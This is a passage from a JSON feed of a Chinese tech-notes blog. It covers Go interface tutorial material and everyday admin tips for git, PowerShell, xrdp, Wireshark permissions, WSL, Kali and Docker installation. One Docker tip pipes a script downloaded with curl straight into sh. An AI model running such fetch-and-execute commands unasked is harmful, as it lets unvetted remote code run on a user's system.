punctuation\">)</span>\n\t\tvalues <span class=\"token operator\">=</span> <span class=\"token function\">appendValues</span><span class=\"token punctuation\">(</span>values<span class=\"token punctuation\">,</span> t<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> values\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>t <span class=\"token operator\">*</span>tree<span class=\"token punctuation\">,</span> value <span class=\"token builtin\">int</span><span class=\"token punctuation\">)</span> <span class=\"token operator\">*</span>tree <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">if</span> t <span class=\"token operator\">==</span> <span class=\"token boolean\">nil</span> <span class=\"token punctuation\">{</span>\n\t\t<span class=\"token comment\">// Equivalent to return &amp;tree{value: value}.</span>\n\t\tt <span class=\"token operator\">=</span> <span class=\"token function\">new</span><span class=\"token punctuation\">(</span>tree<span class=\"token punctuation\">)</span>\n\t\tt<span class=\"token punctuation\">.</span>value <span class=\"token operator\">=</span> value\n\t\t<span class=\"token keyword\">return</span> t\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">if</span> value <span class=\"token operator\">&lt;</span> t<span class=\"token punctuation\">.</span>value <span class=\"token punctuation\">{</span>\n\t\tt<span class=\"token punctuation\">.</span>left <span class=\"token operator\">=</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>left<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span> <span class=\"token keyword\">else</span> <span class=\"token punctuation\">{</span>\n\t\tt<span class=\"token punctuation\">.</span>right <span class=\"token operator\">=</span> <span class=\"token function\">add</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span>right<span class=\"token punctuation\">,</span> value<span class=\"token punctuation\">)</span>\n\t<span class=\"token punctuation\">}</span>\n\t<span class=\"token keyword\">return</span> t\n<span class=\"token punctuation\">}</span>\n\n<span class=\"token keyword\">func</span> <span class=\"token function\">main</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">{</span>\n\t<span class=\"token keyword\">var</span> m <span class=\"token operator\">=</span> <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">int</span><span class=\"token punctuation\">{</span><span class=\"token number\">1</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">9</span><span class=\"token punctuation\">,</span> <span class=\"token number\">3</span><span class=\"token punctuation\">,</span> <span class=\"token number\">5</span><span class=\"token punctuation\">,</span> <span class=\"token number\">7</span><span class=\"token punctuation\">,</span> <span class=\"token number\">2</span><span class=\"token punctuation\">,</span> <span class=\"token number\">4</span><span class=\"token punctuation\">}</span>\n\tt <span class=\"token operator\">:=</span> <span class=\"token function\">Sort</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>m<span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">.</span><span class=\"token function\">String</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span><span class=\"token punctuation\">)</span>\n\tfmt<span class=\"token punctuation\">.</span><span class=\"token function\">Println</span><span class=\"token punctuation\">(</span>t<span class=\"token punctuation\">)</span>\n\n<span class=\"token punctuation\">}</span>\n</code></pre></div><h2>7.2. 接口类型</h2>\n<p>接口类型具体描述了一系列方法的集合，一个实现了这些方法的具体类型是这个接口类型的实例。</p>\n<p>io.Writer类型是用得最广泛的接口之一，因为它提供了所有类型的写入bytes的抽象，包括文件类型，内存缓冲区，网络链接，HTTP客户端，压缩工具，哈希等等。io包中定义了很多其它有用的接口类型。Reader可以代表任意可以读取bytes的类型，Closer可以是任意可以关闭的值，例如一个文件或是网络链接。（到现在你可能注意到了很多Go语言中单方法接口的命名习惯）</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">package</span> io\n<span class=\"token keyword\">type</span> Reader <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">type</span> Closer <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">Close</span><span class=\"token punctuation\">(</span><span class=\"token punctuation\">)</span> <span class=\"token builtin\">error</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>再往下看，我们发现有些新的接口类型通过组合已有的接口来定义。下面是两个例子：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> ReadWriter <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n    Reader\n    Writer\n<span class=\"token punctuation\">}</span>\n<span class=\"token keyword\">type</span> ReadWriteCloser <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n    Reader\n    Writer\n    Closer\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上面用到的语法和结构内嵌相似，我们可以用这种方式以一个简写命名一个接口，而不用声明它所有的方法。这种方式称为接口内嵌。尽管略失简洁，我们可以像下面这样，不使用内嵌来声明io.ReadWriter接口。</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> ReadWriter <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span>\n    <span class=\"token function\">Write</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span>\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>或者甚至使用一种混合的风格：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">type</span> ReadWriter <span class=\"token keyword\">interface</span> <span class=\"token punctuation\">{</span>\n    <span class=\"token function\">Read</span><span class=\"token punctuation\">(</span>p <span class=\"token punctuation\">[</span><span class=\"token punctuation\">]</span><span class=\"token builtin\">byte</span><span class=\"token punctuation\">)</span> <span class=\"token punctuation\">(</span>n <span class=\"token builtin\">int</span><span class=\"token punctuation\">,</span> err <span class=\"token builtin\">error</span><span class=\"token punctuation\">)</span>\n    Writer\n<span class=\"token punctuation\">}</span>\n</code></pre></div><p>上面3种定义方式都是一样的效果。方法顺序的变化也没有影响，唯一重要的就是这个集合里面的方法。</p>\n<h3>练习 7.4</h3>\n<p>strings.NewReader函数通过读取一个string参数返回一个满足io.Reader接口类型的值（和其它值）。实现一个简单版本的NewReader，用它来构造一个接收字符串输入的HTML解析器（§5.2）</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code></code></pre></div><p><strong>练习 7.5：</strong> io包里面的LimitReader函数接收一个io.Reader接口类型的r和字节数n，并且返回另一个从r中读取字节但是当读完n个字节后就表示读到文件结束的Reader。实现这个LimitReader函数：</p>\n<div class=\"language-go\" data-ext=\"go\" data-title=\"go\"><pre class=\"language-go\"><code><span class=\"token keyword\">func</span> <span class=\"token function\">LimitReader</span><span class=\"token punctuation\">(</span>r io<span class=\"token punctuation\">.</span>Reader<span class=\"token punctuation\">,</span> n <span class=\"token builtin\">int64</span><span class=\"token punctuation\">)</span> io<span class=\"token punctuation\">.</span>Reader\n</code></pre></div>",
      "date_published": "2024-07-31T08:52:23.000Z",
      "date_modified": "2024-07-31T08:52:23.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "日常技巧",
      "url": "https://echo0d.github.io/DailyNotes/others/DailySkills.html",
      "id": "https://echo0d.github.io/DailyNotes/others/DailySkills.html",
      "summary": "日常技巧\n其他\n如何让windows的cmd拥有linux的命令\n安装git，然后把git的如下路径添加到Path环境变量\nGit批量修改提交人信息\nPowershell修改profile\n\n所有用户，所有主机 - $PSHOME\\Profile.ps1\n所有用户，当前主机 - $PSHOME\\Microsoft.PowerShell_profile....",
      "content_html": "\n<h2>其他</h2>\n<h3>如何让windows的cmd拥有linux的命令</h3>\n<p>安装git，然后把git的如下路径添加到Path环境变量</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>******\\Git\\usr\\bin\n</code></pre></div><h3>Git批量修改提交人信息</h3>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>git filter-branch --env-filter 'export GIT_AUTHOR_EMAIL=yourname@163.com' --\ngit filter-branch --env-filter 'export GIT_COMMITTER_EMAIL=yourname@163.com' --\ngit filter-branch -f --env-filter 'export GIT_COMMITTER_NAME=yourname' --\ngit filter-branch -f --env-filter 'export GIT_AUTHOR_NAME=yourname' --\ngit push -f origin main\n</code></pre></div><h3>Powershell修改profile</h3>\n<ul>\n<li>所有用户，所有主机 - $PSHOME\\Profile.ps1</li>\n<li>所有用户，当前主机 - $PSHOME\\Microsoft.PowerShell_profile.ps1</li>\n<li>当前用户，所有主机 - $HOME\\Documents\\WindowsPowerShell\\Profile.ps1</li>\n<li>当前用户，当前主机 - $HOME\\Documents\\WindowsPowerShell\\Microsoft.PowerShell_profile.ps1</li>\n</ul>\n<p>例如</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>notepad $PSHOME\\Microsoft.PowerShell_profile.ps1\n</code></pre></div><h3>CMD和Powershell显示执行命令时间</h3>\n<p>Powershell：将如下代码添加到profile文件</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>function prompt {\n    # 显示当前时间\n    $currentTime = Get-Date -Format \"yyyy-MM-dd HH:mm:ss\"\n    Write-Host \"Time: $currentTime\" -NoNewline -ForegroundColor Green\n\n    # PowerShell默认提示符\n    \" PS $($executionContext.SessionState.Path.CurrentLocation)$('&gt;' * ($nestedPromptLevel + 1)) \"\n}\n</code></pre></div><p>\nCMD：新建一个系统变量 PROMPT 值填入\n<code>$T$S$P$G</code>并保存，然后重启 CMD</p>\n<h3>某应用添加到右键</h3>\n<p>以Typora为例，右键某文件夹，以Typora打开：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Windows Registry Editor Version 5.00\n\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Typora]\n@=\"Open in Typora\"\n\"Icon\"=\"D:\\\\install\\\\Typora\\\\resources\\\\assets\\\\app.ico\"\n\n[HKEY_CLASSES_ROOT\\Directory\\shell\\Typora\\command]\n@=\"\\\"D:\\\\install\\\\Typora\\\\Typora.exe\\\" \\\"%1\\\"\"\n</code></pre></div><p>右键文件夹里的空白处，以Typora打开：</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>Windows Registry Editor Version 5.00\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Typora]\n@=\"Open in Typora\"\n\"Icon\"=\"\\\"D:\\\\install\\\\Typora\\\\resources\\\\assets\\\\app.ico\\\"\"\n\n[HKEY_CLASSES_ROOT\\Directory\\Background\\shell\\Typora\\command]\n@=\"\\\"D:\\\\install\\\\Typora\\\\Typora.exe\\\" \\\"%V\\\"\"\n</code></pre></div><h3>使用xrdp连接ubuntu桌面优化&amp;黑屏解决</h3>\n<p>如果不做任何配置，启动之后的桌面是非常别扭的，因为是Gnome的原始桌面，没有左侧的任务栏，窗口也没有最小化按钮，等等一些列问题。解决方案也很简单：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">vim</span> ~/.xsessionrc\n<span class=\"token comment\"># 添加：</span>\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\">GNOME_SHELL_SESSION_MODE</span><span class=\"token operator\">=</span>ubuntu\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">XDG_CURRENT_DESKTOP</span></span><span class=\"token operator\">=</span>ubuntu:GNOME\n<span class=\"token builtin class-name\">export</span> <span class=\"token assign-left variable\"><span class=\"token environment constant\">XDG_CONFIG_DIRS</span></span><span class=\"token operator\">=</span>/etc/xdg/xdg-ubuntu:/etc/xdg\n<span class=\"token comment\"># 重启xrdp</span>\n<span class=\"token function\">sudo</span> systemctl restart xrdp.service\n</code></pre></div><p>一定要在上面步骤执行完后再改下面的，否则还是黑屏，否则需要reboot主机。\n<strong>当你的本机没有注销的话，远程桌面就会黑屏</strong>，最佳解决策略就是退出本地登录，也就是注销登录。或者</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">sudo</span> <span class=\"token function\">vim</span> /etc/xrdp/startwm.sh\n<span class=\"token comment\"># 添加配置</span>\n<span class=\"token builtin class-name\">unset</span> <span class=\"token environment constant\">DBUS_SESSION_BUS_ADDRESS</span>\n<span class=\"token builtin class-name\">unset</span> <span class=\"token environment constant\">XDG_RUNTIME_DIR</span>\n<span class=\"token comment\"># 重启xrdp</span>\n<span class=\"token function\">sudo</span> systemctl restart xrdp.service\n</code></pre></div><h3>xrdp卡顿解决</h3>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">vim</span> /etc/sysctl.conf\n<span class=\"token comment\"># 添加</span>\nnet.core.rmem_max <span class=\"token operator\">=</span> <span class=\"token number\">12582912</span>\nnet.core.wmem_max <span class=\"token operator\">=</span> <span class=\"token number\">8388608</span>\n<span class=\"token comment\"># 执行</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">sysctl</span> <span class=\"token parameter variable\">-p</span>\n<span class=\"token comment\"># 重启 xrdp 服务生效</span>\n<span class=\"token function\">sudo</span> systemctl restart xrdp\n</code></pre></div><h3>ubuntu下wireshark添加root权限</h3>\n<p>wireshark要监控eth0，但是必须要root权限才行。但是，直接用root运行程序是相当危险，也是非常不方便的。解决方法如下：</p>\n<ol>\n<li>添加wireshark用户组\n<code>sudo groupadd wireshark </code></li>\n<li>将dumpcap更改为wireshark用户组\n<code>sudo chgrp wireshark /usr/bin/dumpcap </code></li>\n<li>让wireshark用户组有root权限使用dumpcap\n<code>sudo chmod 4755 /usr/bin/dumpcap </code></li>\n<li>将需要使用的用户名加入wireshark用户组，我的用户名是craftor\n<code>sudo gpasswd -a craftor wireshark </code></li>\n</ol>\n<p>参考：<a href=\"https://blog.csdn.net/liweigao01/article/details/94488191\" target=\"_blank\" rel=\"noopener noreferrer\">ubuntu下wireshark添加root权限_wireshark 加入到root组里面-CSDN博客</a></p>\n<h3>Vmware  启动报错 ‘0xc000007b‘</h3>\n<p>原因：</p>\n<p>C++库改变。</p>\n<p>解决方法：</p>\n<p>windows打开控制面板，然后打开程序，卸载程序(图中左下角)。然后找到图中两个C++程序，分别右键，卸载，系统会弹出安装/卸载程序，然后<strong>点击修复</strong>。</p>\n<figure><figcaption>image-20240813200317802</figcaption></figure>\n<figure><figcaption>image-20240813200437702</figcaption></figure>\n<h1>Kali zsh切换为bash</h1>\n<p>查看当前shell</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token builtin class-name\">echo</span> <span class=\"token environment constant\">$SHELL</span>\n</code></pre></div><p>查看系统中是否有bash文件</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">ls</span> /bin/bash\n</code></pre></div><p>切换bash shell</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>chsh <span class=\"token parameter variable\">-s</span> /bin/bash \n</code></pre></div><p>重启终端</p>\n<p>注：仅当前用户切换成bash shell，如其他用户切换，请切换的其他用户执行上述操作</p>\n<h2>WSL相关</h2>\n<h3>WSL制作快照和回滚</h3>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token comment\"># 查看已安装的系统</span>\nwsl <span class=\"token parameter variable\">-l</span> <span class=\"token parameter variable\">-v</span>\n<span class=\"token comment\"># 做快照</span>\nwsl <span class=\"token parameter variable\">--export</span> Ubuntu-18.04 d:<span class=\"token punctuation\">\\</span>wsl-ubuntu18.04.tar\n\n<span class=\"token comment\"># 注销当前系统</span>\nwsl <span class=\"token parameter variable\">--unregister</span> Ubuntu-18.04\n<span class=\"token comment\"># 回滚</span>\nwsl <span class=\"token parameter variable\">--import</span> Ubuntu-18.04 d:<span class=\"token punctuation\">\\</span>wsl d:<span class=\"token punctuation\">\\</span>wsl-ubuntu18.04.tar <span class=\"token parameter variable\">--version</span> <span class=\"token number\">2</span>\n<span class=\"token comment\"># 设置默认登陆用户为安装时用户名</span>\nubuntu1804 config --default-user USERNAME\n<span class=\"token comment\"># 如果是ubuntu20.04，命令ubuntu1804改为ubuntu2004即可；USERNAME是登录用户名称，如Raymond</span>\n        \n</code></pre></div><h3>WSL启动目录修改</h3>\n<p>\n路径是</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>//wsl$/加wsl里虚拟机的路径\n</code></pre></div><p>类似这样\n</p>\n<h3>WSL2 kali 安装报错</h3>\n<p>我是从MS Store 安装的，下载后点击打开，弹出cmd窗口\n报错信息：</p>\n<div class=\"language-powershell\" data-ext=\"powershell\" data-title=\"powershell\"><pre class=\"language-powershell\"><code>Installing<span class=\"token punctuation\">,</span> this may take a few minutes<span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span> \nWslRegisterDistribution failed with error: 0x80004005 \nError: 0x80004005 ???????\n\nPress any key to <span class=\"token keyword\">continue</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span><span class=\"token punctuation\">.</span>\n\n</code></pre></div><p>解决方法：</p>\n<ol>\n<li><strong>将 LxssManager 服务修改为自动启动</strong></li>\n</ol>\n<p>从服务中修改会提示“拒绝访问”，所以从注册表改：\nwin + R -&gt; regedit -&gt; \\HKEY_LOCAL_MACHINE\\SYSTEM\\CurrentControlSet\\Services\\LxssManager -&gt; 右键 Start 项 -&gt; 将值修改为 2\n默认为 3</p>\n<ol start=\"2\">\n<li><strong>更新wsl</strong></li>\n</ol>\n<p>管理员启动 powershell</p>\n<div class=\"language-powershell\" data-ext=\"powershell\" data-title=\"powershell\"><pre class=\"language-powershell\"><code>wsl <span class=\"token operator\">--</span>update\n</code></pre></div><p>成功安装，再次点击打开即可正常</p>\n<h3>WSL2安装后kali里没工具</h3>\n<p>WSL2默认的kali基本没什么工具，所以这里手动安装，工具集约7G</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token comment\">#更新源</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update\n<span class=\"token comment\"># 安装 </span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> kali-linux-all\n<span class=\"token comment\"># 注意：新版本中kali-linux-all更名为kali-linux-everything</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> kali-linux-everything\n</code></pre></div><h3>WSL安装kali后安装docker报错</h3>\n<p>安装docker</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">apt-get</span> <span class=\"token function\">install</span> docker.io\n</code></pre></div><p>使用systemctl命令报错：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code>xxxx@xxxxx:~$ systemctl start <span class=\"token function\">docker</span>\nSystem has not been booted with systemd as init system <span class=\"token punctuation\">(</span>PID <span class=\"token number\">1</span><span class=\"token punctuation\">)</span>. Can't operate.\nFailed to connect to bus: Host is down\n</code></pre></div><p>可能是因为这个Ubuntu系统并没有使用systemd，可能使用的是SysV init（sysvinit）初始化系统。\n通过如下命令查看：CMD 列，显示 init，可以确定使用的是SysV init初始化系统。</p>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>ps -p 1\n</code></pre></div><p>SysV init：如果您的系统使用 SysVinit 作为 init 系统，您可以使用 service 命令来管理和检查服务状态。例如，要检查 Docker 服务状态，可以运行：</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token function\">sudo</span> <span class=\"token function\">service</span> <span class=\"token function\">docker</span> status\n</code></pre></div><p>还是想要使用systemd，在WSL中启用systemd</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token comment\"># 更新WSL到最新版</span>\nwsl <span class=\"token parameter variable\">--update</span>\n<span class=\"token comment\"># 查看版本</span>\nwsl <span class=\"token parameter variable\">--version</span>\n</code></pre></div><p>然后在Ubuntu实例中，打开或者添加/etc/wsl.conf文件(没有就新建)</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token punctuation\">[</span>boot<span class=\"token punctuation\">]</span>\n<span class=\"token assign-left variable\">systemd</span><span class=\"token operator\">=</span>true\n</code></pre></div><p>重新启动wsl即可。</p>\n<h3>WSL2使用主机的clash代理</h3>\n<p><a href=\"https://eastmonster.github.io/2022/10/05/clash-config-in-wsl/\" target=\"_blank\" rel=\"noopener noreferrer\">https://eastmonster.github.io/2022/10/05/clash-config-in-wsl/</a></p>\n<ol>\n<li>在 Clash 客户端内的操作\n打开客户端的允许局域网连接 (Allow LAN) 开关，如图 1 所示。\n记录下客户端内的端口 (Port)，如这里是 16514. 一般默认端口为 7890.\n<a href=\"https://s2.loli.net/2024/01/22/sla3HO9UVu4wozn.png\" target=\"_blank\" rel=\"noopener noreferrer\"></a>\n这个方法需要 Windows 10/11 22H2 和 WSL 2.0.5 及以上版本\n你可以使用 winver 和 wsl -v 查看你的 Windows 和 WSL 版本。\n如果你使用这个方法，你需要确保 Clash 客户端中设置的系统代理类型为 HTTP 而不是 PAC，否则无法代理 HTTPS 请求:\n<a href=\"https://s2.loli.net/2024/01/24/Y9DhxRw47tzlWIH.png\" target=\"_blank\" rel=\"noopener noreferrer\"></a>\n在 WSL <a href=\"https://github.com/microsoft/WSL/releases/tag/2.0.5\" target=\"_blank\" rel=\"noopener noreferrer\">2.0.5 版本</a>后，一些特性得以稳定，这里要用到的是<a href=\"https://learn.microsoft.com/zh-cn/windows/wsl/networking#mirrored-mode-networking\" target=\"_blank\" rel=\"noopener noreferrer\">镜像模式网络</a>。\n在 C:\\Users&lt;UserName&gt;.wslconfig 文件中 (如果不存在就手动创建一个) 加入以下内容:</li>\n</ol>\n<div class=\"language-text\" data-ext=\"text\" data-title=\"text\"><pre class=\"language-text\"><code>[wsl2]\nnetworkingMode=mirrored\n\n</code></pre></div><p>不过需要注意，shell 的配置文件中不能再 export http_proxy=...</p>\n<h2>Docker相关</h2>\n<h3>安装docker-ce</h3>\n<h4>kali</h4>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token comment\"># 更新现有的软件包列表</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update\n<span class=\"token comment\"># 安装所需工具包</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token parameter variable\">-y</span> <span class=\"token function\">install</span> <span class=\"token function\">curl</span> gnupg2 apt-transport-https software-properties-common ca-certificates\n<span class=\"token comment\"># 导入用于签署Docker软件包的Docker GPG密钥：</span>\n<span class=\"token function\">curl</span> <span class=\"token parameter variable\">-fsSL</span> https://download.docker.com/linux/debian/gpg <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> apt-key <span class=\"token function\">add</span> -\n<span class=\"token comment\"># 添加包含Docker CE最新稳定版本的Docker存储库：</span>\n<span class=\"token builtin class-name\">echo</span> <span class=\"token string\">\"deb [arch=amd64] https://download.docker.com/linux/debian buster stable\"</span> <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> <span class=\"token function\">tee</span>  /etc/apt/sources.list.d/docker.list\n<span class=\"token comment\"># 更新apt包索引</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update\n<span class=\"token comment\"># 在Kali Linux上安装Docker CE</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> docker-ce docker-ce-cli containerd.io\n<span class=\"token comment\"># 检查安装的Docker版本</span>\n<span class=\"token function\">docker</span> version\n</code></pre></div><h4>ubuntu</h4>\n<p><a href=\"https://cloud.tencent.com/developer/article/1854430\" target=\"_blank\" rel=\"noopener noreferrer\">ubuntu安装docker详细步骤 - 腾讯云开发者社区-腾讯云 (tencent.com)open in new window</a>\n<a href=\"https://kalacloud.com/blog/how-to-install-and-use-docker-on-ubuntu/\" target=\"_blank\" rel=\"noopener noreferrer\">Docker 入门指南：如何在 Ubuntu 上安装和使用 Docker - 卡拉云 (kalacloud.com)open in new window</a>\n使用如下脚本来安装 docker 即可:</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token comment\"># Install the latest version docker</span>\n<span class=\"token function\">curl</span> <span class=\"token parameter variable\">-s</span> https://get.docker.com/ <span class=\"token operator\">|</span> <span class=\"token function\">sh</span>\n\n<span class=\"token comment\"># Run docker service</span>\nsystemctl start <span class=\"token function\">docker</span>\n</code></pre></div><p>旧版安装指令:</p>\n<div class=\"language-bash\" data-ext=\"sh\" data-title=\"sh\"><pre class=\"language-bash\"><code><span class=\"token comment\"># 更新现有的软件包列表</span>\n<span class=\"token function\">apt</span> update\n<span class=\"token comment\"># 安装所需工具包</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> apt-transport-https ca-certificates <span class=\"token function\">curl</span> gnupg-agent  software-properties-common\n<span class=\"token comment\"># 然后将官方 Docker 版本库的 GPG 密钥添加到系统中：</span>\n<span class=\"token function\">curl</span> <span class=\"token parameter variable\">-fsSL</span> https://download.docker.com/linux/ubuntu/gpg <span class=\"token operator\">|</span> <span class=\"token function\">sudo</span> apt-key <span class=\"token function\">add</span> -\n<span class=\"token comment\"># 将 Docker 版本库添加到APT源：</span>\n<span class=\"token function\">sudo</span> add-apt-repository <span class=\"token string\">\"deb [arch=amd64] https://download.docker.com/linux/ubuntu focal stable\"</span>\n<span class=\"token comment\"># 用新添加的 Docker 软件包来进行升级更新。</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> update\n<span class=\"token comment\"># 确保要从 Docker 版本库，而不是默认的 Ubuntu 版本库进行安装：</span>\n<span class=\"token function\">apt-cache</span> policy docker-ce\n<span class=\"token comment\"># 安装 Docker ：</span>\n<span class=\"token function\">sudo</span> <span class=\"token function\">apt</span> <span class=\"token function\">install</span> docker-ce\n<span class=\"token comment\"># 现在 Docker 已经安装完毕。我们启动守护程序。检查 Docker 是否正在运行：</span>\n<span class=\"token function\">sudo</span> systemctl status <span class=\"token function\">docker</span>\n<span class=\"token comment\"># 设置 docker 开机自动启动</span>\n<span class=\"token function\">sudo</span> systemctl <span class=\"token builtin class-name\">enable</span> docker.service\n</code></pre></div><h4>debian</h4>\n<p>[在 Debian 上安装 Docker 引擎 | Docker 文档</p>\n",
      "date_published": "2024-07-15T07:45:51.000Z",
      "date_modified": "2024-12-03T02:53:56.000Z",
      "authors": [],
      "tags": []
    },
    {
      "title": "宝藏工具",
      "url": "https://echo0d.github.io/DailyNotes/others/Treasure.html",
      "id": "https://echo0d.github.io/DailyNotes/others/Treasure.html",
      "summary": "宝藏工具\nshell：一个小软件，修改windows右键，很实用包括转至一些系统文件夹，按shift以管理员运行终端等\nsnipaste：F1截图 F3贴图，可以让截图悬浮在任意位置，方便做些对比\nWechat2RSS：公开提供部分公众号RSS，支持私有部署\n宝藏博客\n王帅真 | 王帅真的个人博客，分享编程与思维认知\nAnonySec'Blog (pa...",
